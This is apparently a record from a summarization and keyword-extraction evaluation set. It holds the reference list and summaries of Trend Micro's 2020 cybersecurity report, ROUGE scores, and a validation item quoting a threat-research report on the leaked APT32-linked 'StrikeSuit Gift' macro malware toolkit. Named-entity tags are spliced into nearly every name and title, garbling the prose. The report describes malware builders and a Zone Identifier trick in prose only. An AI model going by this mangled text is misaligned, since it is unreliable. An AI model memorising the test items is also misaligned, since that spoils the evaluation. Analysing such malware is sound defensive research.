6 , [DATE] 2020 ) . Security Week . \u201c [WORK_OF_ART] Pulse [WORK_OF_ART] Secure [WORK_OF_ART] VPN [WORK_OF_ART] Vulnerability [WORK_OF_ART] Exploited [WORK_OF_ART] to [WORK_OF_ART] Deliver [WORK_OF_ART] Ransomware . \u201d [GPE] Accessedon [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [PERSON] Raphael [PERSON] Centeno . ( [DATE] Sept. [DATE] 21 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Cybercriminals [WORK_OF_ART] Distribute [WORK_OF_ART] Backdoor [WORK_OF_ART] With [WORK_OF_ART] VPN [WORK_OF_ART] Installer . \u201d Accessed on [DATE] Feb. [DATE] 5,2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 16 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Malicious Actors Target Comm Apps such as Zoom , [GPE] Slack , Discord . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url comm - apps - such - as - zoom - slack - discord.51 [PERSON] Raphael [PERSON] Centeno , [PERSON] Bren [PERSON] Matthew [PERSON] Ebriega , and [PERSON] Llalum [PERSON] Victoria . ( [DATE] May [DATE] 21 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Backdoor , [ORG] Devil [ORG] Shadow [PERSON] Botnet [PERSON] Hidden in Fake Zoom Installers . \u201d Accessed on [DATE] Feb. [DATE] 5 , [DATE] 2021 , at url devil - shadow - botnet - hidden - in - fake - zoom - installers.html.52 [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 16 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Malicious Actors Target Comm Apps such as Zoom , [GPE] Slack , Discord . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url comm - apps - such - as - zoom - slack - discord.53 [ORG] Trend [ORG] Micro . ( [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c The [DATE] 2020 Cyber Risk Index Goes Global . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] May 14 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Cloud Security : Key Concepts , Threats , and Solutions . \u201d Accessed on [DATE] Jan. [DATE] 20,2021 , at url and - solutions.55 Trend Micro . ( [DATE] April [DATE] 7 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Misconfigured Docker Daemon API Ports Attacked for Kinsing Malware Campaign . \u201dAccessed on [DATE] Feb. [DATE] 5 , [DATE] 2021 , at url docker - daemon - api - ports - attacked - for - kinsing - malware - campaign.44 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report56 Augusto Remillano II and [ORG] Jemimah [ORG] Molina . ( [DATE] May 6 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Coinminer , DDoS Bot Attack Docker Daemon Ports . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url bot - attack - docker - daemon - ports.57 [PERSON] David [PERSON] Fiser . ( [DATE] Dec. 18 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Now Deploying DDoS - Capable [ORG] IRC Bot TNTbotinger . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 at url [PERSON] Alfredo [PERSON] Oliveira and [PERSON] David [PERSON] Fiser . ( [DATE] Oct. 12 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Metasploit [ORG] Shellcodes [ORG] Attack [ORG] Exposed Docker APIs . \u201d Last accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url docker - apis.html.59 [PERSON] Vladimir [PERSON] Kropotov , [PERSON] Robert [PERSON] McArdle , and [PERSON] Fyodor [PERSON] Yarochkin . ( [DATE] Sept. [DATE] 1 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Commodified CybercrimeInfrastructure : [WORK_OF_ART] Exploring [WORK_OF_ART] the [WORK_OF_ART] Underground [WORK_OF_ART] Services [WORK_OF_ART] Market [WORK_OF_ART] for [WORK_OF_ART] Cybercriminals . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/commodified-cybercrime-infrastructure-exploring-the- underground - services - market - for - cybercriminals.60 [PERSON] Vladimir [PERSON] Kropotov and [PERSON] Fyodor [PERSON] Yarochkin . ( [DATE] Nov. [DATE] 16 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Cybercriminal \u2018 [WORK_OF_ART] Cloud [WORK_OF_ART] of Logs \u2019 . \u201d Accessed on [DATE] Jan. 24 , [DATE] 2021 , at url emerging - underground - business - of - selling - access - to - stolen - data.61 Trend Micro . ( [DATE] Dec. [DATE] 8 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Turning [WORK_OF_ART] the Tide : [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] Security [WORK_OF_ART] Predictions [WORK_OF_ART] for [WORK_OF_ART] 2021 . \u201d Accessed on [DATE] Jan. [DATE] 22,2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Aug. [DATE] 26 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Securing the Pandemic - Disrupted Workplace . \u201d Accessed on [DATE] Jan. [DATE] 21 , [DATE] 2021 , aturl [PERSON] Amine [PERSON] Amri et al . ( [DATE] 2020 ) . Forescout . \u201c AMNESIA:33 How [ORG] TCP / IP Stacks Breed Critical Vulnerabilities in [GPE] IoT , OT and IT Devices . \u201dAccessed on [DATE] Jan. 22 , [DATE] 2021 , at url vulnerabilities - in - iot - ot - and - it - devices.64 Amine Amri et al . ( [DATE] 2020 ) . Forescout . \u201c AMNESIA:33 How [ORG] TCP / IP Stacks Breed Critical Vulnerabilities in [GPE] IoT , OT and IT Devices . \u201dAccessed on [DATE] Jan. 22 , [DATE] 2021 , at url vulnerabilities - in - iot - ot - and - it - devices.65 Trend Micro . ( [DATE] Sept. [DATE] 13 , [DATE] 2016 ) . [ORG] Trend [ORG] Micro . \u201c Linux Security : A Closer Look at the Latest Linux Threats . \u201d Accessed on [DATE] Feb. 9 , [DATE] 2021 , at url the - latest - linux - threats.66 Augusto Remillano II and [ORG] Jemimah [ORG] Molina . ( [DATE] July [DATE] 8 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c New Mirai Variant Expands , Exploits CVE-2020 - 1017 . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url exploits - cve-2020 - 10173.html.67 [ORG] Fernando Merces , [PERSON] Augusto [PERSON] Remillano [PERSON] II , and [ORG] Jemimah [ORG] Molina . ( [DATE] July 28 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mirai [WORK_OF_ART] Botnet [WORK_OF_ART] Attack [WORK_OF_ART] IoT [WORK_OF_ART] Devices via CVE-2020 - 5902 . \u201d Accessed on [DATE] Jan. [DATE] 20 , [DATE] 2021 , at url iot - devices - via - cve-2020 - 5902.html.68 [PERSON] Zhengyu [PERSON] Dong . ( [DATE] Nov. 9 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] An [WORK_OF_ART] Old [WORK_OF_ART] Joker \u2019s [WORK_OF_ART] New Tricks : [WORK_OF_ART] Using [WORK_OF_ART] Github [WORK_OF_ART] To [WORK_OF_ART] Hide [WORK_OF_ART] Its [WORK_OF_ART] Payload . \u201d Accessed on Jan.21 , [DATE] 2021 , at url html.69 [ORG] Vit [ORG] Sembera . ( [DATE] Dec. [DATE] 3 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c From Geost to Locker : Monitoring the Evolution of Android Malware Obfuscation . \u201dAccessed on [DATE] Jan. [DATE] 21 , [DATE] 2021 , at url evolution.html.70 National Institute of Standards and Technology . ( n.d . ) . [ORG] National [ORG] Vulnerability [ORG] Database . \u201c [WORK_OF_ART] Vulnerability [WORK_OF_ART] Metrics . \u201d Accessed onFeb . [DATE] 5 , [DATE] 2021 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2020 - 1472 . \u201d Accessed on Jan.22 , [DATE] 2021 , at url [ORG] Ophtek , [ORG] LLC . ( n.d . ) . Ophtek . \u201c [PERSON] Zerologon is the Latest Microsoft Vulnerability . \u201d Accessed on [DATE] Feb. [DATE] 10 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c What is [PERSON] Zerologon ? . \u201d Accessed on [DATE] Jan. 22 , [DATE] 2021 , at url | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] Report74 [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c What is [PERSON] Zerologon ? . \u201d Accessed on [DATE] Jan. 22 , [DATE] 2021 , at url [ORG] Microsoft . ( [DATE] Aug. [DATE] 8 , [DATE] 2020 ) . [ORG] Microsoft . \u201c [WORK_OF_ART] Netlogon [WORK_OF_ART] Elevation [WORK_OF_ART] of [WORK_OF_ART] Privilege [WORK_OF_ART] Vulnerability [WORK_OF_ART] ( CVE-2020 - 1472 ) . \u201d Accessed on [DATE] Jan. [DATE] 22,2021 , at url Lindsey O\u2019Donnell . ( [DATE] Jan. [DATE] 15 , [DATE] 2021 ) . Threatpost . \u201c Microsoft Implements Windows Zerologon Flaw \u2018 Enforcement Mode\u2019 . \u201dLast accessed on [DATE] Feb. [DATE] 10 , [DATE] 2021 , at url mode/163104/.77 [ORG] FireEye , [ORG] Inc [ORG] and [ORG] Ponemon [ORG] Institute [ORG] LLC . ( [DATE] 2021 ) . [PERSON] Respond [PERSON] Software . \u201c [ORDINAL] Second Annual Study on [ORG] the [ORG] Economics [ORG] of [ORG] Security [ORG] Operations [ORG] Centers : What is the True Cost for Effective Results ? \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [GPE] cloudfront.net/wp-content/uploads/2021/01/Ponemon-Institute-FireEye-Second-Annual-Study-Economics-of-the-SOC-2021 . pdf.78 [ORG] Trend [ORG] Micro . ( [DATE] Feb. [DATE] 10 , [DATE] 2017 ) . [ORG] Trend [ORG] Micro . \u201c Best Practices : Identifying and Mitigating Phishing Attacks . \u201d Accessed on [DATE] Jan. [DATE] 24,2021 , at url mitigating - phishing - attacks.79 [ORG] Trend [ORG] Micro . ( [DATE] Oct. [DATE] 25 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Virtual Patching : [WORK_OF_ART] Patch [WORK_OF_ART] Those [WORK_OF_ART] Vulnerabilities [WORK_OF_ART] before [WORK_OF_ART] They [WORK_OF_ART] Can [WORK_OF_ART] Be [WORK_OF_ART] Exploited . \u201dAccessed on [DATE] Jan. 22 , [DATE] 2021 , at url patching - patch - those - vulnerabilities - before - they - can - be - exploited.80 Trend Micro . ( [DATE] Feb. [DATE] 25 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Sprawling [WORK_OF_ART] Reach [WORK_OF_ART] of [PERSON] Complex [PERSON] Threats . \u201d Accessed on [DATE] Jan. [DATE] 21 , [DATE] 2021 , at url | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportTREND MICROTM RESEARCH Trend Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threat techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com", "generated_text": "2020; Trend Micro; threats; the key; trends; a constant state of flux; campaigns; targeted ransomware; ransomware attacks; critical industries; employees; the Covid-19 pandemic; the threat actor; phishing; social engineering; organizations; the use; supply-chain attacks; vulnerabilities; vulnerabilities; compromise; the cloud; IoT; the threat landscape; organizations; malware; a thriving marketplace; products; services; stolen data; leak sites; steal data; organizations; the past; the threat; its losses; the report; technology; protections.", "ref_text": "<START-1>The report provides an overview of the cyberthreat landscape in 2020 and highlights major trends and security issues that affected organizations globally. It focuses on the rise of sophisticated ransomware attacks targeting critical industries, the impact of COVID-19 and remote work on cybersecurity, emerging threats in cloud, IoT and mobile environments, dangerous new vulnerabilities, and the need for comprehensive defense strategies and multilayered security technologies. Key points: - Targeted ransomware attacks continued against prominent organizations in healthcare, manufacturing, finance and government sectors. Ryuk, Egregor and DoppelPaymer were among the prominent ransomware families. Operators used double extortion techniques and increasingly targeted Linux systems. - Phishing remained a dominant threat despite its simplicity, as actors customized URLs for targets. Business email compromise (BEC) also continued, often using COVID-19 themes, though overall BEC volume declined 17% year-over-year. - Supply chain attacks emerged as a means to circumvent target security, highlighted by the major SolarWinds Orion attack. - COVID-19 themes were used extensively, comprising most 2020 BEC subject lines. 16M+ pandemic-related attack detections included spam, phishing and malware. - Remote work increased reliance on VPNs and cloud services, but also exposed organizations to risks from misconfigurations and credential theft. - IoT and mobile threats increased, including router compromise and new Android malware obfuscation techniques, though mobile malware app volumes declined 41%. - 1,453 new vulnerabilities were disclosed, up 40%, including spikes in critical and high severity flaws. Old bugs remained exploited. - The report emphasizes need for layered security combining technologies, strategies and policies to defend today's complex environments against sophisticated, determined actors. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3660477453580902, "gpt3/lexical/rouge_rouge2": 0.07466666666666667, "gpt3/lexical/rouge_rougeL": 0.20689655172413793, "gpt3/lexical/rouge_rougeLsum": 0.20689655172413793, "gpt3_generated_text": ["The Trend Micro 2020 Annual Cybersecurity Report highlights the major cybersecurity challenges and trends of 2020. The year was marked by a constant state of flux, with organizations facing targeted ransomware attacks in critical industries, such as healthcare, government, and manufacturing. Phishing remained a widely used strategy, while social engineering techniques saw small evolutions. Supply-chain attacks became a trend as cybercriminals targeted the security of their targets indirectly. The use of cloud and IoT technologies exposed organizations to security risks, including misconfigurations and weak credential management. The cybercriminal underground was revealed as a thriving marketplace for stolen data. The report aims to equip users and organizations with insights to protect themselves in a constantly evolving threat landscape."]}, {"split_name": "val", "sample_id": "val_58", "prompt_text": "Extract the keywords: The origin story of APT32 macros : The StrikeSuit Gi   that keeps giving [PERSON] Threat research reportSteve [ORG] Miller , Sr . Threat Researcher [PERSON] Silas [PERSON] Cutler , [PERSON] Principal [PERSON] Reverse Engineer27/04/22The origin story of APT32 macros THREAT RESEARCH REPORTTable of contentsPrologueChapter IThe StrikeSuit Gift that keeps giving Summarizing the sourceChapter [ORG] IIA tale of [CARDINAL] three GUIs A song as old as rhyme : Office VBA macrosChapter [ORG] IIILooking the gift horse in the mouth How did the [ORG] RAR get made ? Unboxed source code projects at a glance What \u2019s the deal with all this shellcode ? The [CARDINAL] one from ShellcodeLoader.vb The [CARDINAL] one from test.doc The one from RawShellcode The typical VB macro contentChapter IVStrikeSuit malware development conventions Documenting antivirus and compatibility testing [ORG] Feature testing , housekeeping , and fingerprintsCleaning up the development mess with _ [ORG] Cleanup.bat [ORG] Visual [ORG] Studio Solution User Options ( .suo ) analysisDevelopment in progressTesting features and [ORG] functions46 35204/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTBackup structure [ORG] Macro comparisons Borrowed and repurposed open - source codeChapter [GPE] VStockpiling the unique toolmarks and indicatorsUsernames , handles , and hostnames Distinct macro timestamps from a scheduled task XML file Testing the export of scheduled tasks [ORG] XML [ORG] Developer fingerprints in scheduled task [ORG] XML [ORG] Network - based indicators [ORG] PDB pathsThreadwork of attribution and assessing connections to APT32ShellcodeLoader L.dll APT32 then and [ORG] nowEpilogueAppendixYARA rules VTI queries \u201c Indicators\u201dLinks and [GPE] referencesAPT32 by [ORG] year [ORG] Office macros [PERSON] Visual [PERSON] Studio [DATE] 202235 73304/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTPrologue\u201cThe Gifts of an Enemy are Justly to be Dreaded \u201d Voltaire404/2022The origin story of APT32 macros THREAT RESEARCH REPORTEveryone loves an origin story . When the world learns of new malware and attacks , we are often left pondering the motivations , mulling over the attribution , and sifting through the nitty - gritty bits and bytes to understand the TTPs and tradecraft . Why wasit done , who was behind it , and how did they do it?Analysts , researchers , and investigators of all sorts spend time plotting the dots , drawing connections between data points , helping the evidence speak , and passing judgment on areas of uncertainty . When we dive deep into malware and attacks , we often are left interpreting nuanced artifacts to help us get a glimpse into the original malware development environment . We look to debug information and [ORG] PDB paths to make inferences about the developer workstations . We look to the Rich header metadata to help understand the specifics of the linker , compiler , and architecture of the original development machine . We examine specific malicious functions within a piece of malware to identify code reuse . We identify notable libraries to tease out pieces of software that may be borrowed from public projects around the internet . Part of the fun of analysis is the challenge of the puzzle and the relentless pursuit of insight in the face of complex , limited , or opaque data . Yet , sometimes we get lucky , and we stumble on a piece of malware source code to get a more intimate look at the malware author , a clearer window into the original development environment , and a naked look at the malware itself . This origin story is for all you [PERSON] Visual [PERSON] Basic macro fans out there . In this report , we unearth a demon from the ancient world : a mysterious malware source code package called [PRODUCT] StrikeSuit [PRODUCT] Gift . We examine this source code package in detail and dive deep into development conventions , tradecraft , toolmarks , and potential connections to the threat actor [PERSON] APT32.504/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTChapter [ORG] I604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe StrikeSuit Gift that keeps giving Our thirst for knowledge leads us back in time to the foregone world of [DATE] 2017 . [DATE] The [DATE] year was a dystopia of its own , yet it was the golden age of APT32 . The prolific [GPE] Vietnam - based threat actor was running wild , targeting foreign governments , dissidents , journalists , and pretty much any private corporation trying to do business in [GPE] Vietnam . APT32 , also known by \u201c [ORG] OceanLotus '' and \u201c BISMUTH , \u201d is famous for innovating and bypassing defenses using a combination of custom - developed , open - source , and commercially available tooling to perform intrusion activities . Like many threat actors , APT32 favors phishing via lure documents laden with malicious macros to execute or download a piece of malware . Through following the breadcrumbs of historical macro content , we stumbled across an archive submitted to [ORG] VirusTotal in [DATE] late [DATE] 2017 . This archive contains a litany of malware source code , shellcode , test files , documents , macros , notes , and more , all of which could span [DATE] nearly [DATE] a [DATE] decade of malware development . This malware source package is internally named [PERSON] StrikeSuit [PERSON] Gift . Though it appears to be developed [DATE] years [DATE] ago , dissecting this malware may give us insights into the practices used by malware developers [DATE] today . Furthermore , through inspection of the minutiae , we may establish links to support the gut notion that this source code package was developed or used by APT32.Summarizing the source Occasionally , malware developers will inadvertently leak source code packages by triggering antivirus or endpoint detection products . Once the security vendor has a copy of the malware file , it may be shared or otherwise proliferated around the globe through data - sharing partnerships , backchannel exchanges , and product integrations . Eventually , all roads lead to [GPE] Rome . The [ORG] StrikeSuit [ORG] Gift source package was submitted to [ORG] VirusTotal at [DATE] 2017 [DATE] - 08 [DATE] - 26 07:29:19 [ORG] UTC . The [ORG] StrikeSuit [ORG] Gift package is a [CARDINAL] 2.99 MB RAR archive containing over 200 files , most of which are [PERSON] Visual [PERSON] Studio solutions or source code in a couple of programming languages . This package also includes test documents , text files , built executables , and a couple of other [ORG] RAR and ZIP files . There \u2019s a lot of data here and multiple timelines to look at . To help illustrate this package at a high level , here \u2019s a look at the directory tree [CARDINAL] three levels deep with parentheses to show the last modified timestamp , according to WinRAR . These timestamps are squirrely and imperfect , but they suggest a THREAT RESEARCH REPORT \u251c \u2500 \u2500 AVs [LAW] - Test ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 25 [DATE] 03:10 ) \u2502 \u2514 \u2500 \u2500 [DATE] Result.txt [DATE] \u251c \u2500 \u2500 [ORG] Office [ORG] - Versions ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 25 [DATE] 21:32 ) \u2502 \u2514 \u2500 \u2500 Verions.txt \u251c \u2500 \u2500 ReadMe.txt ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 10 [DATE] 01:25 ) \u2502 \u2502 \u251c \u2500 \u2500 Macros_Builder ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 24 [DATE] 01:21 ) \u2502 \u2502 \u251c \u2500 \u2500 Macros_Builder.sln \u2502 \u2502 \u251c \u2500 \u2500 Macros_Builder.v11.suo \u2502 \u2502 \u2514 \u2500 \u2500 _ [PERSON] Cleanup.bat ( [CARDINAL] 2013 [CARDINAL] - [CARDINAL] 10 [CARDINAL] - [CARDINAL] 29 00:18 ) \u2502 \u251c \u2500 \u2500 [GPE] Macros_Builder_1.0.zip \u2502 \u2502 \u2514 \u2500 \u2500 Macros_Builder ( [DATE] 2016 [DATE] - 04 [DATE] - [DATE] 19 05:32 ) \u2502 \u251c \u2500 \u2500 [ORG] RawShellcode ( [DATE] 2017 [DATE] - 08 [DATE] - 23 [DATE] 00:24 ) \u2502 \u251c \u2500 \u2500 [ORG] WebBuilder \u2502 \u2502 \u251c \u2500 \u2500 HtaDotNet ( 2017 - 08 - 24 01:21 ) \u2502 \u2502 \u2514 \u2500 \u2500 [ORG] ShellcodeLoader ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 18 [DATE] 04:50 ) \u2502 \u2514 \u2500 \u2500 [DATE] WebBuilder.rar [DATE] \u2502 \u2502 \u2514 \u2500 \u2500 [ORG] WebBuilder ( [DATE] 2011 [DATE] - [DATE] 09 [DATE] - 23 [DATE] 20:30 ) \u2502 \u2502 \u251c \u2500 \u2500 HtaDotNet ( [DATE] 2011 [DATE] - [DATE] 09 [DATE] - 23 [DATE] 20:30 ) \u2502 \u2502 \u2514 \u2500 \u2500 [ORG] ShellcodeLoader ( [DATE] 2011 [DATE] - [DATE] 09 [DATE] - 23 [DATE] 20:30 ) \u2514 \u2500 \u2500 Source \u251c \u2500 \u2500 CSharp ( [DATE] 2017 [DATE] - 08 [DATE] - 23 [DATE] 21:30 ) \u2502 \u251c \u2500 \u2500 [ORG] MacrosEmbedding ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 18 00:18 ) \u2502 \u251c \u2500 \u2500 [ORG] MacrosEmbeddingExample ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 13 [DATE] 19:52 ) \u2502 \u2514 \u2500 \u2500 VbaCodeCreator ( [DATE] 2017 [DATE] - 08 [DATE] - 23 [DATE] 21:30 ) \u251c \u2500 \u2500 C_Cpp ( 2017 - 08 - 23 03:45 ) \u2502 \u251c \u2500 \u2500 Binary ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 24 [DATE] 01:21 ) \u2502 \u2514 \u2500 \u2500 [ORG] ShellcodeThreadCaller ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 24 [DATE] 01:21 ) \u2514 \u2500 \u2500 VB ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 20 [DATE] 21:23 ) \u251c \u2500 \u2500 [ORG] ShellcodeLoader ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 20 [DATE] 21:23 ) \u2514 \u2500 \u2500 XmlScriptAnalyst ( [DATE] 2017 [DATE] - 08 [DATE] - [DATE] 16 20:17)At [ORDINAL] first glance , we can see that in [DATE] August [DATE] 2017 this project was in active development . It seems that the malware author may have brought in older projects and files from [DATE] years [DATE] past . These files may have been archives of their own and are kept in the directory structure for reference or in the event the developer needs to pull the ripcord and recover the original , older code . Macros_Builder was from [DATE] 2016 and got new updates in [DATE] August [DATE] 2017 . HtaDotNet and [ORG] ShellcodeLoader are older , maybe as far back as [DATE] 2011 , but were both touched in [DATE] August [DATE] 2017 . A cleanup batch script may have been created or used as far back as [DATE] 2013 but was copied over to help delete extraneous development artifacts . We will dive into more details further down the page , but we804/2022The origin story of APT32 macros THREAT RESEARCH REPORTthink the superficial totality of these timestamps shows a developer who is leaning on old code , making improvements , performing tests , and enhancing a small set of interconnected malware tools.904/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTChapter II1004/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTA tale of [CARDINAL] three GUIs Within the delicate web of source code lie [CARDINAL] three juicy GUIs for us to behold . We begin with the oldest and jump further back in time to [DATE] October [DATE] 2013 , when a malware developer compiled a debug build of [ORG] Office [ORG] Macros [ORG] Builder [ORG] - [ORG] Version 1.0.0 at 2013 - 10 - 08 16:00:51 . This [ORG] GUI tool is to help a legion of intrusion operators inject macros into Office documents . GUIs for hacking tools and malware kits exist to help intrusion operators perform complex tasks quickly , easily , repeatedly , and reliably . GUIs help scale out capabilities across a workforce of varying roles , skills , and experience levels . Once you can make it an easy button , almost anyone can smash it to unleash their evils . [ORG] The [ORG] Office [ORG] Macros [ORG] Builder [ORG] - [ORG] Version [CARDINAL] 1.0.0 above accepts an [ORG] Office file ( .doc ) and a macros ( .vb or .txt ) and uses [ORG] Microsoft . Office . [ORG] Interop . Word and [ORG] Microsoft . Vbe . [ORG] Interop assemblies to jam the macro into the document . The program takes the document and creates an alternate data stream   ADS   with a Zone Identifier of 0 to indicate that it is from \u201c URLZONE_LOCAL_MACHINE , \u201d the most trusted zone.1104/2022The origin story of APT32 macros THREAT RESEARCH REPORTTime marches on , and we fast forward to [DATE] spring [DATE] 2016 . Somewhere around the world , the development team behind [ORG] StrikeSuit [ORG] Gift starts their morning with coffee and pastries and compiles the [ORG] GUI program [ORG] Embed [ORG] Office [ORG] Macros at [DATE] 2016 [DATE] - [DATE] 03 [DATE] - [DATE] 11 09:02:13.We jump ahead to [DATE] 2017 when the threat actor is outed by [ORG] Mandiant . The bosses demand an upgrade from their malware development team . Now , the malware developer [PERSON] Rachael is suddenly tasked to enhance an older codebase to make it a bit more versatile for intrusion operations . Rachael begins with some slight modifications to the older macro text , add_schedule_vba.txt , makes some enhancements to the [ORG] GUI , and then compiles the new version of [ORG] Embed [ORG] Office [ORG] Macros at 8/17/2017 08:18:44.1204/2022The origin story of APT32 macros [GPE] THREAT RESEARCH REPORTWhile looking at the pretty pictures may not give us foresight into the future of this malware toolkit , the visual progression of these GUIs is important because this is where the many malware functionalities bear fruit . These GUIs represent the final vehicles for mass malware operations and will be used to create [CARDINAL] hundreds , if not [CARDINAL] thousands , of malicious macros for [ORG] Office documents . A song as old as rhyme : Office VBA macros Let \u2019s take a quick break from the timeline and recap the ever - loathed scourge of the infosec world : [ORG] Microsoft [ORG] Office macros.1304/2022The origin story of APT32 macros THREAT RESEARCH [PERSON] REPORTVisual [PERSON] Basic   VB , [PERSON] Visual [PERSON] Basic [PERSON] Scripts   [PERSON] VBS , and [PERSON] Visual [PERSON] Basic for Applications   VBA   are basically the same programming language , except that [ORG] VBA is designed to run within a [ORG] Microsoft [ORG] Office application such as Word , [ORG] Excel , [ORG] PowerPoint , etc . In the context of malware and phishing documents , we often just refer to any [ORG] VB scripting content as \u201c macros . \u201d Every IT administrator and business person will tell you that macros have a legitimate purpose and are integral to crucial company processes . The supposed legitimate purpose is exactly why malicious macros are so effective in phishing campaigns . [PERSON] Macros are so common in cross - company , cross - business processes that many users are easily coerced into executing even the malicious ones . Attackers know this and act accordingly . If you \u2019re new to VB macros or maybe want a quick refresher , we recommend these great reads to recap what macros are and examples of how they may show up in phishing or lure documents : \u25cf url \u25cf url \u25cf url \u25cf url origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTChapter [ORG] III1504/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTNow , we \u2019ll jump to [DATE] late [DATE] August [DATE] 2017 when someone on the malware development or operation team makes a crucial mistake . Rachael or [CARDINAL] one of their counterparts transfers the [ORG] RAR archive of [ORG] StrikeSuit [ORG] Gift to a machine with antivirus software running . The embedded shellcode and macro content inside of the [ORG] RAR trigger an AV signature , and the archive file is hoovered up and blasted across the internet . Those monitoring recent submissions to [ORG] VirusTotal would see an alert for the [ORG] YARA rule \u201c APT32_ActiveMime_Lure \u201d and arrive at the [ORG] RAR archive for [PRODUCT] StrikeSuit [PRODUCT] Gift . Looking the gift horse in the mouth It 's tough to analyze this much malware source code line by line , so let \u2019s do our best to summarize the high points and tease out juicy deets that may be interesting to our understanding of the actor \u2019s capabilities , the development tradecraft , and then we can connect what we \u2019re seeing here to attacks out in the world . How did the [ORG] RAR get made ? We do not have many clues to describe how the main [ORG] RAR file was created ; however , we can take an educated guess that it was created with WinRAR 4.x for the folder on the mounted volume [NORP] D:\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1 . each of the archived files and directories with a [QUANTITY] four [QUANTITY] - byte \u201c mtime \u201d timestamp , likely representing the [ORG] NTFS last modified time from Windows . If we open this [ORG] RAR file with WinRAR , the utility identifies this as RAR 4.x archive . According to the documentation , the [ORG] RAR 4.x format stores the last modified timestamps in local time rather than [ORG] UTC . This is not important as we \u2019re skeptical about timestamps to begin with but good to know that in older versions of WinRAR , we should see a [QUANTITY] four [QUANTITY] - byte combo of [ORG] MS [ORG] DOS [ORG] TIME and DATE local timestamps . In modern versions of WinRAR , the default is \u201c high - precision \u201d eight [QUANTITY] - byte uint64 Windows FILETIME UTC timestamps ; however , if we deselect the high - precision flag , the timestamp becomes a [QUANTITY] four [QUANTITY] - byte uint32 Unix time_t . Is n\u2019t forensics fun ? These [CARDINAL] three examples were created based on the original [PERSON] StrikeSuit [PERSON] Gift [PERSON] RAR file , looking at the [ORG] RAR last modified timestamp for \\Office - Versions\\Verions.txt . We took this file 